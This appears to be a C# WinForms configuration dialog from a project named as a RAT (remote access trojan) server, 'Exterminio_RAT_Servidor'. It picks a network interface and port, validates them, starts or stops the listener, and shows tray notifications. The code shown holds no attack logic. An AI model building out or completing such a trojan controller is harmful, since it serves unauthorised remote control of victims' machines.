using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace Exterminio_RAT_Servidor
{
    public partial class ConfigExterminioServidor : Form
    {
        public event EventHandler<ServerConfigEventArgs> ServerConfigChanged;
        public event EventHandler ConfigurationApplied;
        
        private NotifyIcon notifyIcon;
        
        public ConfigExterminioServidor()
        {
            InitializeComponent();
            LoadNetworkInterfaces();
            SetupDefaultPort();
            SetupForm();
            SetupNotificationSystem();
        }

        private void SetupForm()
        {
            // Configurar el formulario
            this.Text = "Configuración del Servidor";
            this.Size = new Size(400, 300);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            
            // Configurar el estilo del toggle switch
            SetupToggleSwitchStyle();
        }

        private void SetupToggleSwitchStyle()
        {
            // Configurar colores del toggle switch
            guna2ToggleSwitch1_IniciarServidor.CheckedState.BorderColor = Color.Red;
            guna2ToggleSwitch1_IniciarServidor.CheckedState.FillColor = Color.Red;
            guna2ToggleSwitch1_IniciarServidor.CheckedState.InnerBorderColor = Color.White;
            guna2ToggleSwitch1_IniciarServidor.CheckedState.InnerColor = Color.White;
            
            guna2ToggleSwitch1_IniciarServidor.UncheckedState.BorderColor = Color.Orange;
            guna2ToggleSwitch1_IniciarServidor.UncheckedState.FillColor = Color.Orange;
            guna2ToggleSwitch1_IniciarServidor.UncheckedState.InnerBorderColor = Color.White;
            guna2ToggleSwitch1_IniciarServidor.UncheckedState.InnerColor = Color.White;
        }

        private void SetupNotificationSystem()
        {
            try
            {
                // Crear el notify icon con el logo personalizado
                notifyIcon = new NotifyIcon();
                
                // Cargar el icono desde el archivo Logo.ico
                string iconPath = Path.Combine(Application.StartupPath, "Resources", "Logo.ico");
                if (File.Exists(iconPath))
                {
                    notifyIcon.Icon = new Icon(iconPath);
                }
                else
                {
                    // Fallback a icono por defecto si no encuentra el archivo
                    notifyIcon.Icon = SystemIcons.Application;
                }
                
                notifyIcon.Text = "Configuración del Servidor";
                notifyIcon.Visible = true;
            }
            catch (Exception ex)
            {
                // Si falla, usar icono por defecto
                notifyIcon = new NotifyIcon();
                notifyIcon.Icon = SystemIcons.Application;
                notifyIcon.Text = "Configuración del Servidor";
                notifyIcon.Visible = true;
            }
        }

        private void ShowNotification(string message, string title = "Servidor", ToolTipIcon icon = ToolTipIcon.Info)
        {
            try
            {
                if (notifyIcon != null)
                {
                    notifyIcon.ShowBalloonTip(3000, title, message, icon);
                }
                else
                {
                    // Fallback a MessageBox si no hay notify icon
                    MessageBox.Show(message, title, MessageBoxButtons.OK, 
                        icon == ToolTipIcon.Error ? MessageBoxIcon.Error :
                        icon == ToolTipIcon.Warning ? MessageBoxIcon.Warning : MessageBoxIcon.Information);
                }
            }
            catch (Exception ex)
            {
                // Fallback a MessageBox si falla la notificación
                MessageBox.Show(message, title, MessageBoxButtons.OK, 
                    icon == ToolTipIcon.Error ? MessageBoxIcon.Error :
                    icon == ToolTipIcon.Warning ? MessageBoxIcon.Warning : MessageBoxIcon.Information);
            }
        }

        private void LoadNetworkInterfaces()
        {
            try
            {
                guna2ComboBox1_Red.Items.Clear();
                
                // Obtener todas las interfaces de red
                NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
                
                foreach (NetworkInterface ni in interfaces)
                {
                    if (ni.OperationalStatus == OperationalStatus.Up && 
                        (ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet || 
                         ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211))
                    {
                        IPInterfaceProperties ipProps = ni.GetIPProperties();
                        foreach (UnicastIPAddressInformation ip in ipProps.UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                            {
                                // Solo agregar IPs que no sean loopback
                                if (!IPAddress.IsLoopback(ip.Address))
                                {
                                    string interfaceInfo = $"{ni.Name} - {ip.Address}";
                                    guna2ComboBox1_Red.Items.Add(interfaceInfo);
                                }
                            }
                        }
                    }
                }
                
                if (guna2ComboBox1_Red.Items.Count > 0)
                {
                    guna2ComboBox1_Red.SelectedIndex = 0;
                    // Debug: mostrar las interfaces cargadas
                    Console.WriteLine($"Interfaces cargadas: {guna2ComboBox1_Red.Items.Count}");
                    for (int i = 0; i < guna2ComboBox1_Red.Items.Count; i++)
                    {
                        Console.WriteLine($"  {i}: {guna2ComboBox1_Red.Items[i]}");
                    }
                }
                else
                {
                    ShowNotification("No se encontraron interfaces de red válidas", "Advertencia", ToolTipIcon.Warning);
                }
            }
            catch (Exception ex)
            {
                ShowNotification($"Error al cargar interfaces de red: {ex.Message}", "Error", ToolTipIcon.Error);
            }
        }

        private void SetupDefaultPort()
        {
            guna2TextBox1_Puerto.Text = "8080";
            guna2TextBox1_Puerto.PlaceholderText = "Ingrese el puerto (ej: 8080)";
        }

        private void guna2ToggleSwitch1_IniciarServidor_CheckedChanged(object sender, EventArgs e)
        {
            if (guna2ToggleSwitch1_IniciarServidor.Checked)
            {
                // Validar configuración antes de iniciar
                if (string.IsNullOrEmpty(guna2TextBox1_Puerto.Text))
                {
                    ShowNotification("Por favor ingrese un puerto válido", "Error", ToolTipIcon.Warning);
                    guna2ToggleSwitch1_IniciarServidor.Checked = false;
                    return;
                }

                if (!int.TryParse(guna2TextBox1_Puerto.Text, out int port) || port <= 0 || port > 65535)
                {
                    ShowNotification("Por favor ingrese un puerto válido (1-65535)", "Error", ToolTipIcon.Warning);
                    guna2ToggleSwitch1_IniciarServidor.Checked = false;
                    return;
                }

                if (guna2ComboBox1_Red.SelectedItem == null)
                {
                    ShowNotification("Por favor seleccione una interfaz de red", "Error", ToolTipIcon.Warning);
                    guna2ToggleSwitch1_IniciarServidor.Checked = false;
                    return;
                }

                // Obtener la IP seleccionada
                string selectedInterface = guna2ComboBox1_Red.SelectedItem.ToString();
                string ipAddress = ExtractIPAddress(selectedInterface);
                
                if (string.IsNullOrEmpty(ipAddress))
                {
                    ShowNotification("No se pudo extraer una IP válida de la interfaz seleccionada", "Error", ToolTipIcon.Warning);
                    guna2ToggleSwitch1_IniciarServidor.Checked = false;
                    return;
                }

                // Disparar evento con la configuración
                ServerConfigChanged?.Invoke(this, new ServerConfigEventArgs
                {
                    IPAddress = ipAddress,
                    Port = port,
                    IsStarting = true
                });
                
                // Mostrar notificación de éxito
                ShowNotification($"Servidor iniciado en {ipAddress}:{port}", "Servidor Activo", ToolTipIcon.Info);
                
                // Disparar evento de configuración aplicada
                ConfigurationApplied?.Invoke(this, EventArgs.Empty);
                
                // Cerrar el formulario de configuración
                this.Close();
            }
            else
            {
                // Disparar evento para detener el servidor
                ServerConfigChanged?.Invoke(this, new ServerConfigEventArgs
                {
                    IsStarting = false
                });
            }
        }

        public string GetSelectedIPAddress()
        {
            if (guna2ComboBox1_Red.SelectedItem != null)
            {
                string selectedInterface = guna2ComboBox1_Red.SelectedItem.ToString();
                return ExtractIPAddress(selectedInterface);
            }
            return null;
        }

        public int GetPort()
        {
            if (int.TryParse(guna2TextBox1_Puerto.Text, out int port))
            {
                return port;
            }
            return 8080; // Puerto por defecto
        }

        public bool IsServerEnabled()
        {
            return guna2ToggleSwitch1_IniciarServidor.Checked;
        }

        private string ExtractIPAddress(string interfaceText)
        {
            try
            {
                // Buscar la IP en el texto de la interfaz
                if (interfaceText.Contains(" - "))
                {
                    string[] parts = interfaceText.Split(new string[] { " - " }, StringSplitOptions.None);
                    if (parts.Length >= 2)
                    {
                        string ipPart = parts[1].Trim();
                        
                        // Validar que sea una IP válida
                        if (IPAddress.TryParse(ipPart, out IPAddress ip))
                        {
                            return ipPart;
                        }
                    }
                }
                
                // Si no encuentra el formato esperado, buscar cualquier IP en el texto
                string[] words = interfaceText.Split(' ', '-', '_');
                foreach (string word in words)
                {
                    string trimmedWord = word.Trim();
                    if (IPAddress.TryParse(trimmedWord, out IPAddress ip))
                    {
                        return trimmedWord;
                    }
                }
                
                return null;
            }
            catch
            {
                return null;
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (notifyIcon != null)
            {
                notifyIcon.Visible = false;
                notifyIcon.Dispose();
            }
            base.OnFormClosing(e);
        }
    }

    public class ServerConfigEventArgs : EventArgs
    {
        public string IPAddress { get; set; }
        public int Port { get; set; }
        public bool IsStarting { get; set; }
    }
}
